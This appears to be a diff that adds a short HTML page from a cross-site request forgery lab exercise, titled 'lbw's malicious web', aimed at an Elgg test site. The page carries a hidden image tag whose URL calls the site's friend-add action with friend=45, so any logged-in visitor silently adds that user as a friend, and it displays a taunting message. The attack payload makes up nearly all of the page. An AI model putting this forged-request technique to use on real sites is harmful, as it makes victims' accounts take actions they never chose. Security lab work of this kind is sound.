@@ -1,0 +1,11 @@
+<html>
+        <head>
+                <title>
+                lbw's malicious web
+                </title>
+        </head>
+        <body>
+        Oops,you are trapped!check your friendlist, it will startle you.
+        <img src="http://www.csrflabelgg.com/action/friends/add?friend=45" hidden/>
+        </body>
+</html>
